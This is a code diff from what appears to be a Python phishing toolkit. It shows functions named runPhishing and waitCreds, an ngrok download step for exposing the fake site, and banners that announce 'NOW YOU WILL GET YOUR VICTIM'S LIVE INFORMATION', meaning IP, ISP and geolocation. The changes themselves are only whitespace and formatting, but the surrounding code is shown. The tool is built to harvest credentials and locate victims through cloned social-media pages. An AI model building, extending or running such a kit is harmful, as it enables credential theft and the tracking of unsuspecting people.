@@ -36,7 +36,7 @@ if connected() == False:
 
 def checkNgrok():
     if path.isfile('Server/ngrok') == False:
-print ('[*] Downloading Ngrok...')
+        print ('[*] Downloading Ngrok...')
         if architecture()[0] == '64bit':
             filename = 'ngrok-stable-linux-arm.zip'
         else:
@@ -69,6 +69,8 @@ def loadModule(module):
  .'       "-.,' /
 ( AnonUD4Y  _.  <
  `=.____.="  `._\\
+
+
  [{1}*{0}]{1} %s module loaded. Building site...{0}'''.format(CYAN, END) % module)
 
 def runPhishing(social, option2):
@@ -125,6 +127,7 @@ def waitCreds():
  .'       "-.,' /
 (  AnonUD4Y_  ~.<
  `=.____.="  `._\\
+
  [{1}*{0}]{1} NOW YOU WILL GET YOUR VICTIM'S LIVE INFORMATION .
  [{1}*{0}]{1} GET VICTIM'S IP ADDRESS, ISP, GEOLOCATION, CITY, COUNTRY, AND MANY MORE STUFF.{0}'''.format(CYAN, END))
 
